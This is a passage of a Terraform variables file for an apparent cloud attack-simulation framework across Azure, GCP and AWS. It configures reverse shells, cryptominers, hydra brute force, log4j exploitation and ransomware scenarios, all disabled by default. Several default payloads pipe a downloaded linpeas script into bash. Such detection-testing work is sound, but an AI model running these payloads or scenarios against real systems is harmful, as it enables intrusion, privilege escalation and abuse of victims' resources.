##################################################
# Context
##################################################

variable "parent" {
  type = list(string)
  default = []
} 

variable "config" {
  type = object({
    context = object({
      global = object({
        environment               = string
        deployment                = string
        disable_all               = bool
        enable_all                = bool
      })
      azure = object({
        enabled                   = bool
        runbook = object({
          target = object({
            drop = object({
              malware = object({
                eicar = object({ 
                  enabled                     = bool
                  eicar_path                  = string
                  eicar_win_path              = string
                })
              })
            })
            connect = object({
              badip = object({
                enabled                     = bool
                iplist_url                  = string
                retry_delay_secs            = number
              })
              nmap_port_scan = object({
                enabled                     = bool
                nmap_scan_host              = string
                nmap_scan_ports             = list(number)
              })
              oast = object({
                enabled                     = bool
                retry_delay_secs            = number
              })
              codecov = object({
                enabled                     = bool
                use_ssl                     = bool
                git_origin                  = string
                env_secrets                 = list(string)
                host_ip                     = string
                host_port                   = number
              })
              reverse_shell = object({
                enabled                     = bool
                host_ip                     = string
                host_port                   = number
              })
            })
            listener = object({
              port_forward = object({
                enabled                     = bool
                port_forwards               = list(object({
                                                src_port      = number
                                                dst_port      = number
                                                dst_ip        = string
                                                description   = string
                                              }))
              })
            })
            execute = object({
              docker_cpu_miner = object({
                enabled                     = bool
                minergate_name              = string
                minergate_image             = string
                minergate_server            = string
                minergate_user              = string
                attack_delay                = number
              })
              cpu_miner = object({
                enabled                     = bool
                minergate_server            = string
                minergate_user              = string
                xmrig_version               = string
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_azure_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
          attacker = object({
            connect = object({
              ssh_shell_multistage = object({
                enabled = bool
                user_list = string
                password_list = string
                attack_delay = number
                payload = string
                task = string
                target_ip = string
                target_port = number
                reverse_shell_host = string
                reverse_shell_port = number
              })
            })
            listener = object({
              http = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
              })
            })
            responder = object({
              reverse_shell = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                payload                     = string
              })
              reverse_shell_multistage = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                payload                     = string
                iam2rds_role_name           = string
                iam2rds_session_name        = string
                attack_delay                = number
                reverse_shell_host          = string
              })
              port_forward = object({
                enabled                     = bool
                listen_port                 = number
              })
            })
            execute = object({
              exploit_npm_app = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                payload                     = string
                attack_delay                = number
              })
              exploit_authapp = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                attack_delay                = number
                compromised_user_first_name = string
                compromised_user_last_name  = string
              })
              docker_exploit_log4j_app = object({
                enabled                     = bool
                attacker_http_port          = number
                attacker_ldap_port          = number
                attacker_ip                 = string
                target_ip                   = string
                target_port                 = number
                payload                     = string
                reverse_shell               = bool
                reverse_shell_port          = number
                attack_delay                = number
              })
              docker_composite_compromised_credentials = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_ransomware = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_defense_evasion = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_host_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_guardduty = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_composite_host_compromise = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_azure_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
        })
      })
      gcp = object({
        region                    = string
        project_id                = string
        enabled                   = bool
        osconfig = object({
          target = object({
            drop = object({
              malware = object({
                eicar = object({ 
                  enabled                     = bool
                  eicar_path                  = string
                  eicar_win_path              = string
                })
              })
            })
            connect = object({
              badip = object({
                enabled                     = bool
                iplist_url                  = string
                retry_delay_secs            = number
              })
              nmap_port_scan = object({
                enabled                     = bool
                nmap_scan_host              = string
                nmap_scan_ports             = list(number)
              })
              oast = object({
                enabled                     = bool
                retry_delay_secs            = number
              })
              codecov = object({
                enabled                     = bool
                use_ssl                     = bool
                git_origin                  = string
                env_secrets                 = list(string)
                host_ip                     = string
                host_port                   = number
              })
              reverse_shell = object({
                enabled                     = bool
                host_ip                     = string
                host_port                   = number
              })
            })
            listener = object({
              port_forward = object({
                enabled                     = bool
                port_forwards               = list(object({
                                                src_port      = number
                                                dst_port      = number
                                                dst_ip        = string
                                                description   = string
                                              }))
              })
            })
            execute = object({
              docker_cpu_miner = object({
                enabled                     = bool
                minergate_name              = string
                minergate_image             = string
                minergate_server            = string
                minergate_user              = string
                attack_delay                = number
              })
              cpu_miner = object({
                enabled                     = bool
                minergate_server            = string
                minergate_user              = string
                xmrig_version               = string
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_gcp_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
          attacker = object({
            connect = object({
              ssh_shell_multistage = object({
                enabled = bool
                user_list = string
                password_list = string
                attack_delay = number
                payload = string
                task = string
                target_ip = string
                target_port = number
                reverse_shell_host = string
                reverse_shell_port = number
              })
            })
            listener = object({
              http = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
              })
            })
            responder = object({
              reverse_shell = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                payload                     = string
              })
              reverse_shell_multistage = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                payload                     = string
                iam2rds_role_name           = string
                iam2rds_session_name        = string
                attack_delay                = number
                reverse_shell_host          = string
              })
              port_forward = object({
                enabled                     = bool
                listen_port                 = number
              })
            })
            execute = object({
              exploit_npm_app = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                payload                     = string
                attack_delay                = number
              })
              exploit_authapp = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                attack_delay                = number
                compromised_user_first_name = string
                compromised_user_last_name  = string
              })
              docker_exploit_log4j_app = object({
                enabled                     = bool
                attacker_http_port          = number
                attacker_ldap_port          = number
                attacker_ip                 = string
                target_ip                   = string
                target_port                 = number
                payload                     = string
                reverse_shell               = bool
                reverse_shell_port          = number
                attack_delay                = number
              })
              docker_composite_compromised_credentials = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_ransomware = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_defense_evasion = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_host_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_guardduty = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_composite_host_compromise = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_gcp_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
        })
      })
      aws = object({
        region                    = string
        profile_name              = string
        enabled                   = bool
        ssm = object({
          target = object({
            drop = object({
              malware = object({
                eicar = object({ 
                  enabled                     = bool
                  eicar_path                  = string
                  eicar_win_path              = string
                })
              })
            })
            connect = object({
              badip = object({
                enabled                     = bool
                iplist_url                  = string
                retry_delay_secs            = number
              })
              nmap_port_scan = object({
                enabled                     = bool
                nmap_scan_host              = string
                nmap_scan_ports             = list(number)
              })
              oast = object({
                enabled                     = bool
                retry_delay_secs            = number
              })
              codecov = object({
                enabled                     = bool
                use_ssl                     = bool
                git_origin                  = string
                env_secrets                 = list(string)
                host_ip                     = string
                host_port                   = number
              })
              reverse_shell = object({
                enabled                     = bool
                host_ip                     = string
                host_port                   = number
                windows_host_port                   = number
              })
            })
            listener = object({
              port_forward = object({
                enabled                     = bool
                port_forwards               = list(object({
                                                src_port      = number
                                                dst_port      = number
                                                dst_ip        = string
                                                description   = string
                                              }))
              })
            })
            execute = object({
              docker_cpu_miner = object({
                enabled                     = bool
                minergate_name              = string
                minergate_image             = string
                minergate_server            = string
                minergate_user              = string
                attack_delay                = number
              })
              cpu_miner = object({
                enabled                     = bool
                minergate_server            = string
                minergate_user              = string
                xmrig_version               = string
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_aws_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
          attacker = object({
            connect = object({
              ssh_shell_multistage = object({
                enabled = bool
                user_list = string
                password_list = string
                attack_delay = number
                payload = string
                task = string
                target_ip = string
                target_port = number
                reverse_shell_host = string
                reverse_shell_port = number
              })
            })
            listener = object({
              http = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
              })
            })
            responder = object({
              reverse_shell = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                payload                     = string
              })
              reverse_shell_multistage = object({
                enabled                     = bool
                listen_ip                   = string
                listen_port                 = number
                windows_listen_port         = number
                payload                     = string
                windows_payload             = string
                iam2rds_role_name           = string
                iam2rds_session_name        = string
                attack_delay                = number
                reverse_shell_host          = string
                reverse_shell_port          = number
              })
              port_forward = object({
                enabled                     = bool
                listen_port                 = number
              })
            })
            execute = object({
              exploit_npm_app = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                payload                     = string
                attack_delay                = number
              })
              exploit_authapp = object({
                enabled                     = bool
                target_ip                   = string
                target_port                 = number
                attack_delay                = number
                compromised_user_first_name = string
                compromised_user_last_name  = string
              })
              docker_exploit_log4j_app = object({
                enabled                     = bool
                attacker_http_port          = number
                attacker_ldap_port          = number
                attacker_ip                 = string
                target_ip                   = string
                target_port                 = number
                payload                     = string
                reverse_shell               = bool
                reverse_shell_port          = number
                attack_delay                = number
              })
              docker_composite_compromised_credentials = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_ransomware = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_defense_evasion = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_cloud_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_host_cryptomining = object({
                enabled                     = bool
                compromised_credentials     = any
                protonvpn_user              = string
                protonvpn_password          = string
                protonvpn_tier              = number
                protonvpn_server            = string
                protonvpn_protocol          = string
                protonvpn_privatekey        = string
                wallet                      = string
                minergate_user              = string
                nicehash_user               = string
                compromised_keys_user       = string
                attack_delay                = number
              })
              docker_composite_guardduty = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_composite_host_compromise = object({
                enabled                     = bool
                attack_delay                = number
              })
              docker_nmap = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                ports                       = list(number)
                attack_delay                = number
              })
              docker_hydra = object({
                enabled                     = bool
                use_tor                     = bool
                scan_local_network          = bool
                targets                     = list(string)
                custom_user_list            = list(string)
                custom_password_list        = list(string)
                user_list                   = string
                password_list               = string
                attack_delay                = number
              })
              generate_web_traffic = object({
                enabled                     = bool
                delay                       = number
                urls                        = list(string)
              })
              generate_aws_cli_traffic = object({
                enabled                     = bool
                compromised_credentials     = any
                compromised_keys_user       = string
                profile                     = string
                commands                    = list(string)
              })
            })
          })
        })
      })
    })  
  })

  default = {
    context = {
      global = {
        environment               = "target"
        deployment                = "default"
        disable_all               = false
        enable_all                = false
      }
      azure = {
        enabled                   = false
        runbook = {
          target = {
            drop = {
              malware = {
                eicar = { 
                  enabled                     = false
                  eicar_path                  = "/tmp/eicar"
                  eicar_win_path              = "C:\\eicar"
                }
              }
            }
            connect = {
              badip = {
                enabled                     = false
                iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
                retry_delay_secs            = 1800
              }
              nmap_port_scan = {
                enabled                     = false
                nmap_scan_host              = "portquiz.net"
                nmap_scan_ports             = [80,443,23,22,8080,3389,27017,3306,6379,5432,389,636,1389,1636]
              }
              oast = {
                enabled                     = false
                retry_delay_secs            = 1800
              }
              codecov = {
                enabled                     = false
                use_ssl                     = false
                git_origin                  = "git@git.localhost:repo/repo.git"
                env_secrets                 = ["SECRET=supersecret123"]
                host_ip                     = null
                host_port                   = 8080
              }
              reverse_shell = {
                enabled                     = false
                host_ip                     = null
                host_port                   = 4444
              }
            }
            listener = {
              port_forward = {
                enabled                     = false
                port_forwards               = [{
                                                src_port      = 1234
                                                dst_port      = 4444
                                                dst_ip        = "127.0.0.1"
                                                description   = "Example"
                                              }]
              }
            }
            execute = {
              docker_cpu_miner = {
                enabled                     = false
                minergate_name              = "xmrig"
                minergate_image             = "xmrig/xmrig"
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                attack_delay                = 50400
              },
              cpu_miner = {
                enabled                     = false
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                xmrig_version               = "6.5.3"
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_azure_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "azure-traffic"
                commands                    = []
              }
            }
          }
          attacker = {
            connect = {
              ssh_shell_multistage = {
                enabled = false
                user_list = "/tmp/hydra-users.txt"
                password_list = "/tmp/hydra-passwords.txt"
                attack_delay = 50400
                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                task = "custom"
                target_ip = null
                target_port = 22
                reverse_shell_host = null
                reverse_shell_port = 4444
              }
            }
            listener = {
              http = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = 8080
              }
            }
            responder = {
              reverse_shell = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
              }
              reverse_shell_multistage = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                iam2rds_session_name        = "attacker-session"
                attack_delay                = 50400
                reverse_shell_host          = null
              }
              port_forward = {
                enabled                     = false
                listen_port                 = 8888
              }
            }
            execute = {
              exploit_npm_app = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8089
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                attack_delay                = 50400
              }
              exploit_authapp = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8000
                attack_delay                = 50400
                compromised_user_first_name = null
                compromised_user_last_name  = null
              }
              docker_exploit_log4j_app = {
                enabled                     = false
                attacker_http_port          = 8088
                attacker_ldap_port          = 1389
                attacker_ip                 = null
                target_ip                   = null
                target_port                 = null
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                reverse_shell               = false
                reverse_shell_port          = 0
                attack_delay                =  50400
              },
              docker_composite_compromised_credentials = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_ransomware = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_defense_evasion = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_host_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_guardduty = {
                enabled                     = false
                attack_delay                =  50400
              },
              docker_composite_host_compromise = {
                enabled                     = false
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_azure_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "azure-traffic"
                commands                    = []
              }
            }
          }
        }
      }
      gcp = {
        region                    = "us-central1"
        project_id                = null
        enabled                   = false
        osconfig = {
          target = {
            drop = {
              malware = {
                eicar = { 
                  enabled                     = false
                  eicar_path                  = "/tmp/eicar"
                  eicar_win_path              = "C:\\eicar"
                }
              }
            }
            connect = {
              badip = {
                enabled                     = false
                iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
                retry_delay_secs            = 1800
              }
              nmap_port_scan = {
                enabled                     = false
                nmap_scan_host              = "portquiz.net"
                nmap_scan_ports             = [80,443,23,22,8080,3389,27017,3306,6379,5432,389,636,1389,1636]
              }
              oast = {
                enabled                     = false
                retry_delay_secs            = 1800
              }
              codecov = {
                enabled                     = false
                use_ssl                     = false
                git_origin                  = "git@git.localhost:repo/repo.git"
                env_secrets                 = ["SECRET=supersecret123"]
                host_ip                     = null
                host_port                   = 8080
              }
              reverse_shell = {
                enabled                     = false
                host_ip                     = null
                host_port                   = 4444
              }
            }
            listener = {
              port_forward = {
                enabled                     = false
                port_forwards               = [{
                                                src_port      = 1234
                                                dst_port      = 4444
                                                dst_ip        = "127.0.0.1"
                                                description   = "Example"
                                              }]
              }
            }
            execute = {
              docker_cpu_miner = {
                enabled                     = false
                minergate_name              = "xmrig"
                minergate_image             = "xmrig/xmrig"
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                attack_delay                = 50400
              },
              cpu_miner = {
                enabled                     = false
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                xmrig_version               = "6.5.3"
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_gcp_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "gcp-traffic"
                commands                    = []
              }
            }
          }
          attacker = {
            connect = {
              ssh_shell_multistage = {
                enabled = false
                user_list = "/tmp/hydra-users.txt"
                password_list = "/tmp/hydra-passwords.txt"
                attack_delay = 50400
                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                task = "custom"
                target_ip = null
                target_port = 22
                reverse_shell_host = null
                reverse_shell_port = 4444
              }
            }
            listener = {
              http = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = 8080
              }
            }
            responder = {
              reverse_shell = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
              }
              reverse_shell_multistage = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                iam2rds_session_name        = "attacker-session"
                attack_delay                = 50400
                reverse_shell_host          = null
              }
              port_forward = {
                enabled                     = false
                listen_port                 = 8888
              }
            }
            execute = {
              exploit_npm_app = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8089
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                attack_delay                = 50400
              }
              exploit_authapp = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8000
                attack_delay                = 50400
                compromised_user_first_name = null
                compromised_user_last_name  = null
              }
              docker_exploit_log4j_app = {
                enabled                     = false
                attacker_http_port          = 8088
                attacker_ldap_port          = 1389
                attacker_ip                 = null
                target_ip                   = null
                target_port                 = null
